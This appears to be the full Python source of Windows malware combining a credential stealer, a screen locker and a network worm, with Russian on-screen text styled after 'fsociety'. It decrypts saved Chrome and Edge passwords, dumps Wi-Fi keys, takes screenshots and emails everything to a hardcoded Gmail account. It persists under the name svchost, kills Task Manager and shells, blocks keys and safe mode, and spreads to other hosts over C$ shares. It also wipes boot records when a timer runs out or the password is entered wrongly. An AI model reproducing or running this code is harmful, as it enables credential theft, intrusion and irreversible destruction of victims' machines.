import os, sys, time, threading, tempfile, tkinter as tk
from tkinter import PhotoImage
import urllib.request, smtplib, socket, subprocess, base64, random, re, json
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import cv2, numpy as np
from PIL import ImageGrab
import sqlite3, win32crypt, shutil, winreg, ctypes

PASSWORD = "1601"
MAX_ATTEMPTS = 4
TIMER_FILE = os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'), "Microsoft", "Windows", "timer.dat")
GMAIL_LOGIN = "xzx78848@gmail.com"
GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
RECEIVER_EMAIL = "xzx78848@gmail.com"
VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp4"
AUDIO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp3"
LOGO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/logo.png"
LOCKER_MUSIC_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc).mp3"
VIDEO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4.mp4")
AUDIO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4.mp3")
LOGO_PATH = os.path.join(tempfile.gettempdir(), "logo.png")
LOCKER_MUSIC_PATH = os.path.join(tempfile.gettempdir(), "Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc).mp3")
attempts_left = MAX_ATTEMPTS

# ===== ОТКЛЮЧЕНИЕ WIN =====
def disable_win_key():
    try:
        for hkey in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
            try:
                k = winreg.OpenKey(hkey, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1); winreg.CloseKey(k)
            except: pass
            try:
                k2 = winreg.OpenKey(hkey, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(k2, "DisableLockWorkstation", 0, winreg.REG_DWORD, 1); winreg.CloseKey(k2)
            except: pass
    except: pass
    try:
        import keyboard
        keyboard.block_key('windows'); keyboard.block_key('left windows'); keyboard.block_key('right windows')
        for c in ['win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','win+i','win+a','win+s','win+p','win+t','win+ctrl+d','win+ctrl+f4','win+shift+m','left windows','right windows','left windows+l','right windows+l']:
            try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
            except: pass
    except: pass

def enable_win_key():
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0); winreg.CloseKey(k)
        k2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k2, "DisableLockWorkstation", 0, winreg.REG_DWORD, 0); winreg.CloseKey(k2)
    except: pass

def run_hidden(cmd):
    try: subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
    except: pass

def get_timer():
    try:
        if os.path.exists(TIMER_FILE):
            with open(TIMER_FILE, 'r') as f: return float(f.read().strip())
    except: pass
    end_time = time.time() + 3600
    save_timer(end_time)
    return end_time

def save_timer(end_time):
    try:
        os.makedirs(os.path.dirname(TIMER_FILE), exist_ok=True)
        with open(TIMER_FILE, 'w') as f: f.write(str(end_time))
    except: pass

def timer_check_loop():
    while True:
        if get_timer() - time.time() <= 0: destroy_windows_forever()
        time.sleep(5)

def destroy_windows_forever():
    run_hidden('bcdedit /delete {current} /f')
    run_hidden('bootrec /fixmbr')
    run_hidden('shutdown /r /t 0 /f')
    os._exit(0)

def hide_process():
    try: ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
    except: pass

def kill_taskmgr_loop():
    while True:
        for p in ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe"]:
            run_hidden(f"taskkill /f /im {p}")
        time.sleep(0.05)

def block_everything():
    try:
        import keyboard
        for k in ['alt','ctrl','shift','tab','caps lock','esc','f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','print screen','scroll lock','pause','insert','home','end','page up','page down','up','down','left','right','windows','left windows','right windows','delete']:
            try: keyboard.block_key(k)
            except: pass
        for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','ctrl+c','ctrl+v']:
            try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
            except: pass
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1); winreg.CloseKey(k)
        try:
            k2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k2, "DisableTaskMgr", 0, winreg.REG_DWORD, 1); winreg.CloseKey(k2)
        except: pass
    except: ctypes.windll.user32.BlockInput(True)

def unblock_all():
    try: ctypes.windll.user32.BlockInput(False)
    except: pass
    try: import keyboard; keyboard.unhook_all()
    except: pass
    enable_win_key()

def block_safe_mode():
    run_hidden('bcdedit /deletevalue {current} safeboot')
    run_hidden('bcdedit /set {current} bootstatuspolicy ignoreallfailures')
    run_hidden('bcdedit /set {current} recoveryenabled no')

def scan_network():
    try:
        arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).decode('cp866', errors='replace')
        return list(set(re.findall(r'\d+\.\d+\.\d+\.\d+', arp)))
    except: return []

def infect_network():
    my_path = os.path.abspath(__file__)
    for ip in scan_network():
        try:
            run_hidden(f'net use \\\\{ip}\\C$ /user:admin admin')
            shutil.copy2(my_path, f'\\\\{ip}\\C$\\Windows\\Temp\\svchost.pyw')
            run_hidden(f'wmic /node:{ip} process call create "pythonw C:\\Windows\\Temp\\svchost.pyw"')
        except: pass

def add_to_startup():
    try:
        cp = os.path.abspath(__file__)
        pp = os.path.splitext(cp)[0] + ".pyw"
        if not cp.endswith(".pyw"):
            try: shutil.copy2(cp, pp)
            except: pass
            cp = pp
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "svchost", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"'); winreg.CloseKey(k)
        startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        shutil.copy2(cp, os.path.join(startup, 'svchost.pyw'))
        try:
            k2 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k2, "svchost", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"'); winreg.CloseKey(k2)
        except: pass
        run_hidden(f'schtasks /create /tn "svchost" /tr "\\"{pythonw}\\" \\"{cp}\\"" /sc ONLOGON /rl HIGHEST /f')
    except: pass

def download_file(url, path):
    try:
        if os.path.exists(path): os.remove(path)
        urllib.request.urlretrieve(url, path)
    except: pass

def anim_fsociety():
    a = tk.Tk(); a.attributes('-fullscreen', True); a.attributes('-topmost', True)
    a.configure(bg='black'); a.overrideredirect(True)
    lbl = tk.Label(a, text="", bg='black', fg='white', font=('Courier', 50, 'bold')); lbl.pack(expand=True)
    for t in ["f","f s","f s o","f s o c","f s o c i","f s o c i e","f s o c i e t","f s o c i e t y"]:
        lbl.config(text=t); a.update(); time.sleep(0.3)
    time.sleep(1)
    sub = tk.Label(a, text="", bg='black', fg='#ff4444', font=('Courier', 20)); sub.pack(pady=20)
    for i in range(len("тебя приветствует")+1):
        sub.config(text="тебя приветствует"[:i]); a.update(); time.sleep(0.1)
    time.sleep(2); a.destroy()

def anim_stealer():
    a = tk.Tk(); a.attributes('-fullscreen', True); a.attributes('-topmost', True)
    a.configure(bg='black'); a.overrideredirect(True)
    tk.Label(a, text="Стиллер ворует данные...", bg='black', fg='white', font=('Courier', 20, 'bold')).pack(expand=True, pady=(0,50))
    bar = tk.Canvas(a, width=400, height=30, bg='black', highlightthickness=1, highlightbackground='white'); bar.pack()
    bar_text = tk.Label(a, text="0%", bg='black', fg='white', font=('Courier', 12)); bar_text.pack(pady=10)
    info = tk.Label(a, text="", bg='black', fg='#0f0', font=('Courier', 10)); info.pack()
    for percent, text in [(10,"Пароли Chrome..."),(20,"WiFi пароли..."),(30,"Cookies..."),(50,"IP адреса..."),(70,"Файлы..."),(90,"Отправка..."),(100,"ГОТОВО!")]:
        bar.delete('all'); bar.create_rectangle(0, 0, 400*percent/100, 30, fill='#0f0', outline='')
        bar_text.config(text=f"{percent}%"); info.config(text=text); a.update(); time.sleep(0.5)
    time.sleep(2); a.destroy()

def anim_connect():
    a = tk.Tk(); a.attributes('-fullscreen', True); a.attributes('-topmost', True)
    a.configure(bg='black'); a.overrideredirect(True)
    lbl = tk.Label(a, text="", bg='black', fg='#0f0', font=('Courier', 14), justify='left'); lbl.pack(expand=True)
    current = ""
    for line in ["[*] Connecting to router...","[*] Bypassing firewall...","[*] Access granted!","[*] I am in your network...","[*] Connected to: " + socket.gethostname(),"","[✓] WE ARE FSOCIETY"]:
        current += line + "\n"; lbl.config(text=current); a.update(); time.sleep(0.4)
    time.sleep(3); a.destroy()

def play_video():
    download_file(VIDEO_URL, VIDEO_PATH)
    download_file(AUDIO_URL, AUDIO_PATH)
    time.sleep(0.3)
    try:
        v = tk.Tk(); v.attributes('-fullscreen', True); v.attributes('-topmost', True)
        v.configure(bg='black'); v.overrideredirect(True)
        v.protocol("WM_DELETE_WINDOW", lambda: None)
        lbl = tk.Label(v, bg='black'); lbl.pack(expand=True, fill='both')
        try: subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', AUDIO_PATH], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
        except: pass
        cap = cv2.VideoCapture(VIDEO_PATH)
        if cap.isOpened():
            fps = cap.get(cv2.CAP_PROP_FPS)
            if fps <= 0: fps = 30
            sw, sh = v.winfo_screenwidth(), v.winfo_screenheight()
            fc = 0; vs = time.time()
            while cap.isOpened():
                ret, frame = cap.read()
                if not ret: break
                fc += 1
                expected = fc / fps
                elapsed = time.time() - vs
                if expected > elapsed: time.sleep(expected - elapsed)
                frame = cv2.resize(frame, (sw, sh))
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                img = tk.PhotoImage(data=cv2.imencode('.ppm', frame)[1].tobytes())
                lbl.config(image=img); lbl.image = img; v.update()
            cap.release()
        v.destroy()
    except: pass

def mega_steal():
    report = ["="*60, "DEDSEK STEALER", "="*60]
    report.append(f"USER: {os.environ.get('USERNAME')} | PC: {socket.gethostname()}")
    try: report.append(f"PUBLIC IP: {urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode()}")
    except: pass
    try: report.append(f"LOCAL IP: {socket.gethostbyname(socket.gethostname())}")
    except: pass
    try: report.append("\nNETWORK:\n" + subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).decode('cp866','replace')[:2000])
    except: pass
    for browser, path in [("CHROME", os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')),
                          ("EDGE", os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'))]:
        if os.path.exists(path):
            report.append(f"\n=== {browser} ===")
            try:
                db = os.path.join(tempfile.gettempdir(), f'{browser}.db')
                shutil.copy2(path, db)
                cur = sqlite3.connect(db).cursor()
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, user, pw in cur:
                    try:
                        pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
                        report.append(f"URL: {url}\nLOGIN: {user}\nPASS: {pwd}")
                    except: pass
                cur.close()
                try: os.remove(db)
                except: pass
            except: pass
    try:
        report.append("\n=== WIFI ===")
        output = subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).decode('cp866','replace')
        for line in output.split('\n'):
            if 'Все профили' in line:
                p = line.split(':')[1].strip()
                if p:
                    det = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).decode('cp866','replace')
                    for dl in det.split('\n'):
                        if 'Содержимое ключа' in dl: report.append(f"WiFi: {p} | PASS: {dl.split(':')[1].strip()}")
    except: pass
    try:
        ss = os.path.join(tempfile.gettempdir(), 'desktop.jpg')
        ImageGrab.grab().save(ss, 'JPEG', quality=50)
        send_file_email(ss, "[DedSek_Logs] Screenshot")
        try: os.remove(ss)
        except: pass
    except: pass
    report.append(f"\nTIME: {time.strftime('%d.%m.%Y %H:%M:%S')}")
    text = '\n'.join(report)
    for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]): send_email(part, f"[DedSek_Logs] [{i+1}]")

def send_email(msg, subj=None):
    try:
        m = MIMEText(msg, 'plain', 'utf-8')
        m['Subject'] = subj or 'DedSek'; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
    except: pass

def send_file_email(fp, desc):
    try:
        if not os.path.exists(fp): return
        m = MIMEMultipart()
        m['Subject'] = desc; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
        with open(fp, 'rb') as f:
            p = MIMEBase('application', 'octet-stream'); p.set_payload(f.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(fp)}"')
            m.attach(p)
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
    except: pass

class WinLocker:
    def __init__(self):
        self.root = tk.Tk(); self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True); self.win.attributes('-topmost', True)
        self.win.configure(bg='black'); self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None); self.win.focus_force()
        global attempts_left
        
        # ЛОГОТИП
        download_file(LOGO_URL, LOGO_PATH)
        try:
            logo = PhotoImage(file=LOGO_PATH)
            logo = logo.subsample(4, 4)
            lbl_logo = tk.Label(self.win, image=logo, bg='black')
            lbl_logo.image = logo
            lbl_logo.place(x=10, y=10)
        except: pass
        
        # ТАЙМЕР
        self.timer_end = get_timer()
        self.timer_label = tk.Label(self.win, text="", bg='black', fg='#ff4444', font=('Courier', 30, 'bold'))
        self.timer_label.place(relx=0.5, rely=0.1, anchor='center')
        self.update_timer()
        
        # МУЗЫКА В ФОНЕ
        download_file(LOCKER_MUSIC_URL, LOCKER_MUSIC_PATH)
        try:
            import pygame
            pygame.mixer.init()
            pygame.mixer.music.load(LOCKER_MUSIC_PATH)
            pygame.mixer.music.play(-1)
        except: pass
        
        msg = f"""Привет друг!

Вот чего доводит интернет.

Вот смотри, ты скачивал игры или что там из интернета?
Вот доскачался. Сиди и жуй мой винлокер.

FSOCIETY тебя приветствует!

Смотри, ты хочешь перезагрузить ПК? У тебя не получится.
ПК перезагрузить получится, но избавиться от меня - нет.
Я везде. Я в твоём роутере.
Я знаю все твои данные.
У меня есть cookies файлы, пароли, логины, почты и т.д.

МЫ FSOCIETY.
YOU FUCK.

ПОПЫТОК: {MAX_ATTEMPTS}"""
        
        tk.Label(self.win, text=msg, bg='black', fg='white', font=('Courier',10,'bold'), justify='center').place(relx=0.5, rely=0.45, anchor='center')
        
        cf = tk.Frame(self.win, bg='black'); cf.place(relx=0.5, rely=0.82, anchor='center')
        tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='white', font=('Courier',14,'bold')).pack(pady=(0,5))
        self.pw = tk.Entry(cf, show="*", font=('Courier',14,'bold'), bg='white', fg='black', relief='solid', bd=2)
        self.pw.pack(pady=(0,5), ipadx=40, ipady=3)
        self.sl = tk.Label(cf, text=f"ОСТАЛОСЬ: {attempts_left}", bg='black', fg='white', font=('Courier',12,'bold'))
        self.sl.pack()
        self.pw.bind('<Return>', self.check); self.pw.focus_force()
        self.win.after(100, self._keep)
    
    def update_timer(self):
        remaining = self.timer_end - time.time()
        if remaining <= 0: destroy_windows_forever()
        h = int(remaining // 3600); m = int((remaining % 3600) // 60); s = int(remaining % 60)
        self.timer_label.config(text=f"{h:02d}:{m:02d}:{s:02d}")
        self.win.after(1000, self.update_timer)
    
    def _keep(self):
        try: self.win.focus_force(); self.pw.focus_force(); self.win.after(100, self._keep)
        except: pass
    
    def check(self, e=None):
        global attempts_left
        if self.pw.get() == PASSWORD:
            try: pygame.mixer.music.stop()
            except: pass
            unblock_all()
            self.sl.config(text="ВЕРНО!", fg='white'); self.win.update()
            try: os.remove(TIMER_FILE)
            except: pass
            time.sleep(1); self.root.destroy(); os._exit(0)
        else:
            attempts_left -= 1
            if attempts_left > 0: self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='white')
            else:
                try: pygame.mixer.music.stop()
                except: pass
                self.sl.config(text="404 | ОШИБКА", fg='white'); self.win.update()
                time.sleep(2); destroy_windows_forever()
            self.pw.delete(0, tk.END)

if __name__ == "__main__":
    disable_win_key()
    hide_process()
    threading.Thread(target=mega_steal, daemon=True).start()
    add_to_startup()
    block_safe_mode()
    threading.Thread(target=kill_taskmgr_loop, daemon=True).start()
    threading.Thread(target=infect_network, daemon=True).start()
    threading.Thread(target=timer_check_loop, daemon=True).start()
    
    anim_fsociety()
    anim_stealer()
    anim_connect()
    play_video()
    block_everything()
    WinLocker()
    tk.mainloop()
